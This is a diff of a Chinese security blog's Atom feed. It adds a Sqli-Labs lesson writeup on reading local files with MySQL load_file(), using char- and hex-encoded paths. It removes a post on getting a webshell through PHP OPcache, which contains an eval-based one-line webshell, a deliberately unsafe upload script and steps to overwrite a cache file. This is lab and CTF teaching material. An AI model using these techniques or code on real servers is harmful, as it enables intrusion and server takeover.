@@ -106,6 +106,58 @@
   </entry>
   
   <entry>
+    <title>Sqli-Labs:Less7-writeup</title>
+    <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/"/>
+    <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/</id>
+    <published>2017-07-12T01:52:18.000Z</published>
+    <updated>2017-07-12T05:07:22.126Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less7 是 dump out file</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p>
+<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>用于读取本地文件内容。有几个条件限制：</p>
+<ul>
+<li>需要有读取文件的权限</li>
+<li>需要知道文件的绝对物理路径。</li>
+</ul>
+<p>假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下：</p>
+<h3 id="直接使用绝对路径"><a href="#直接使用绝对路径" class="headerlink" title="直接使用绝对路径"></a>直接使用绝对路径</h3><p>注意对路径中斜杠的处理。</p>
+<ul>
+<li>mysql&gt; select load_file(“C://TEST.txt”);</li>
+<li>mysql&gt; select load_file(“C:/TEST.txt”);</li>
+<li>mysql&gt; select load_file(“C:\TEST.txt”);</li>
+</ul>
+<p>以上返回结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------+</div><div class="line">| load_file(&quot;C://TEST.txt&quot;) |</div><div class="line">+---------------------------+</div><div class="line">| chybeta                   |</div><div class="line">+---------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>但若输入以下查询则会返回空即不成功。</p>
+<p>mysql&gt; select load_file(“C:\TEST.txt”);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+--------------------------+</div><div class="line">| load_file(&quot;C:\TEST.txt&quot;) |</div><div class="line">+--------------------------+</div><div class="line">| NULL                     |</div><div class="line">+--------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><h4 id="char（）"><a href="#char（）" class="headerlink" title="char（）"></a>char（）</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行asci编码后进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116));</div></pre></td></tr></table></figure></p>
+<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------------------------+</div><div class="line">| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |</div><div class="line">+---------------------------------------------------------+</div><div class="line">| chybeta                                                 |</div><div class="line">+---------------------------------------------------------+</div><div class="line">1 row in set (0.02 sec)</div></pre></td></tr></table></figure></p>
+<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行十六进制编码后进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(0x433a5c5c544553542e747874);</div></pre></td></tr></table></figure></p>
+<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------+</div><div class="line">| load_file(0x433a5c5c544553542e747874) |</div><div class="line">+---------------------------------------+</div><div class="line">| chybeta                               |</div><div class="line">+---------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/Audi-1/
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Sqli-Labs:Less5-6-writeup</title>
     <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/"/>
     <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/</id>
@@ -225,9 +277,9 @@
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
-    
       <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
     
   </entry>
   
@@ -743,9 +795,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
   </entry>
   
@@ -780,9 +832,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
       <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
     
@@ -1183,9 +1235,9 @@
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -1225,66 +1277,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>利用PHP的OPcache机制getshell</title>
-    <link href="http://yoursite.com/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/"/>
-    <id>http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/</id>
-    <published>2017-05-13T15:04:03.000Z</published>
-    <updated>2017-06-20T04:38:00.668Z</updated>
-    
-    <content type="html"><![CDATA[<p>OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。<br>本文是对 <a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank" rel="external">《binary-webshell-through-opcache-in-php-7》</a>一文的测试。<br><a id="more"></a></p>
-<h1 id="关于OPcache"><a href="#关于OPcache" class="headerlink" title="关于OPcache"></a>关于OPcache</h1><p>在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是<code>/var/www/html/opcache</code>，未访问前，<code>opcache</code>文件夹为空。接下去我去访问 <code>index.php</code>后，php会在 <code>opcache</code>文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 <code>index.php</code>所在目录结构相同，同时生成了 <code>index.php.bin</code>。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg" alt=""><br>这个<code>index.php.bin</code> 就是 <code>index.php</code> 的缓存文件。并且作为<code>www-data</code>用户，我们对 <code>5672f68788bcb25b11403b33f5d1497f</code> 具有读写执行权限。这样，我们想办法把这个<code>index.php.bin</code>替换为包含有恶意代码的<code>index.php.bin</code>文件，当我们再次去访问<code>index.php</code>时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。</p>
-<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@4db5ba2ab3bf:/var/www/html# php -v</div><div class="line">PHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )</div><div class="line">Copyright (c) 1997-2017 The PHP Group</div><div class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</div><div class="line">    with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies</div></pre></td></tr></table></figure>
-<h2 id="配置OPcache"><a href="#配置OPcache" class="headerlink" title="配置OPcache"></a>配置OPcache</h2><h3 id="开启OPcache"><a href="#开启OPcache" class="headerlink" title="开启OPcache"></a>开启OPcache</h3><p>在php配置文件 <code>php.ini</code> 的约莫 1745 行左右，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.enable=0</div></pre></td></tr></table></figure></p>
-<p>去掉前面的分号<code>;</code>，将<code>0</code>改为<code>1</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.enable=1</div></pre></td></tr></table></figure></p>
-<h3 id="关闭时间戳验证"><a href="#关闭时间戳验证" class="headerlink" title="关闭时间戳验证"></a>关闭时间戳验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.validate_timestamps=1</div></pre></td></tr></table></figure>
-<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.validate_timestamps=0</div></pre></td></tr></table></figure></p>
-<h3 id="设置OPcache缓存路径"><a href="#设置OPcache缓存路径" class="headerlink" title="设置OPcache缓存路径"></a>设置OPcache缓存路径</h3><p>继续向下翻，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache=</div></pre></td></tr></table></figure></p>
-<p>这里我修改后的配置是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache= &quot;/var/www/html/opcache&quot;</div></pre></td></tr></table></figure></p>
-<h3 id="设置缓存文件优先级"><a href="#设置缓存文件优先级" class="headerlink" title="设置缓存文件优先级"></a>设置缓存文件优先级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache_only=0</div></pre></td></tr></table></figure>
-<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache_only=1</div></pre></td></tr></table></figure></p>
-<h3 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h3><p>这里我以apache作为web服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 resart</div></pre></td></tr></table></figure></p>
-<p>重启，使前面修改的<code>php.ini</code>生效</p>
-<h2 id="www目录"><a href="#www目录" class="headerlink" title="www目录"></a>www目录</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    	&lt;form action=<span class="string">"upload-file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    		&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;filename:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</div><div class="line">    		&lt;br/&gt;</div><div class="line">        	&lt;label <span class="keyword">for</span>=<span class="string">"filepath"</span>&gt;filepath:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"text"</span> name=<span class="string">"filepath"</span> id=<span class="string">"filepath"</span> /&gt;</div><div class="line">        	&lt;br/&gt;</div><div class="line">    		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</div><div class="line">    	&lt;/form&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload-file.php"></a>upload-file.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$path = $_POST[<span class="string">'filepath'</span>];</div><div class="line">    <span class="keyword">echo</span> <span class="string">"filename: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;   </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],  $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"save : "</span> . $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];    </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>那个。。代码写得很丑。。仅为测试之用：）</p>
-<h3 id="phpinfo-php"><a href="#phpinfo-php" class="headerlink" title="phpinfo.php"></a>phpinfo.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>现在开始黑盒测试。。</p>
-<h2 id="利用phpinfo获取信息"><a href="#利用phpinfo获取信息" class="headerlink" title="利用phpinfo获取信息"></a>利用phpinfo获取信息</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachefilecache.jpg?raw=true" alt=""></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachetimestamp.jpg?raw=true" alt=""><br>可知，OPcache缓存路径在 <code>/var/www/html/opcache</code> 中。且服务器端开启了 <code>opcache.file_cache_only</code>,禁用了<code>opcache.validate_timestamps</code>。 这是能成功利用的条件。</p>
-<h2 id="php7-opcache-override-py"><a href="#php7-opcache-override-py" class="headerlink" title="php7-opcache-override.py"></a>php7-opcache-override.py</h2><p>由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">hp7-opcache-override.py</a> 来计算。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/systemid.jpg" alt=""></p>
-<p>得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f</p>
-<h2 id="构建恶意的缓存文件"><a href="#构建恶意的缓存文件" class="headerlink" title="构建恶意的缓存文件"></a>构建恶意的缓存文件</h2><p>恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 <code>index.php</code>,内容是一句话木马<code>&lt;?php @eval($_POST[test]);?&gt;</code>，之后访问它。在对应的缓存文件夹里可以看到<code>index.php.bin</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/local.jpg?raw=true" alt=""><br>用十六进制编辑器打开，将<code>OPCACHE.</code>后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/bin2.jpg" alt=""></p>
-<h2 id="覆盖原缓存文件"><a href="#覆盖原缓存文件" class="headerlink" title="覆盖原缓存文件"></a>覆盖原缓存文件</h2><p>在覆盖之前，先看看服务器上的原缓存文件长啥样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/beforeupload.jpg?raw=true" alt=""></p>
-<p>这里利用上传来进行覆盖。访问<code>index.php</code>,选择修改后的<code>index.php.bin</code>进行上传，上传路径为要覆盖的缓存文件的相对地址 <code>opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/</code>。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/upload.jpg?raw=true" alt=""></p>
-<p>上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/afterupload.jpg?raw=true" alt=""></p>
-<h2 id="菜刀连上"><a href="#菜刀连上" class="headerlink" title="菜刀连上"></a>菜刀连上</h2><p>此时再去访问 <code>index.php</code>,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/webshell.jpg?raw=true" alt=""></p>
-<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题</p>
-<h2 id="ASIS-CTF-2016-–-BinaryCloud"><a href="#ASIS-CTF-2016-–-BinaryCloud" class="headerlink" title="ASIS CTF 2016 – BinaryCloud"></a>ASIS CTF 2016 – BinaryCloud</h2><p>这题是通过上传来覆盖，但后端有各种过滤。<br>附上<a href="https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/" target="_blank" rel="external">writeup</a></p>
-<h2 id="ALICTF-2016-homework"><a href="#ALICTF-2016-homework" class="headerlink" title="ALICTF 2016  - homework"></a>ALICTF 2016  - homework</h2><p>这题利用sql注入的dumpfile来实现对缓存文件的覆盖。<br>附上<a href="https://github.com/tothi/ctfs/tree/master/alictf-2016/homework" target="_blank" rel="external">writeup</a></p>
-<p><em>（Author:chybeta）</em></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。&lt;br&gt;本文是对 &lt;a href=&quot;http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/&quot;&gt;《binary-webshell-through-opcache-in-php-7》&lt;/a&gt;一文的测试。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-      <category term="OPcache" scheme="http://yoursite.com/tags/OPcache/"/>
     
   </entry>
   
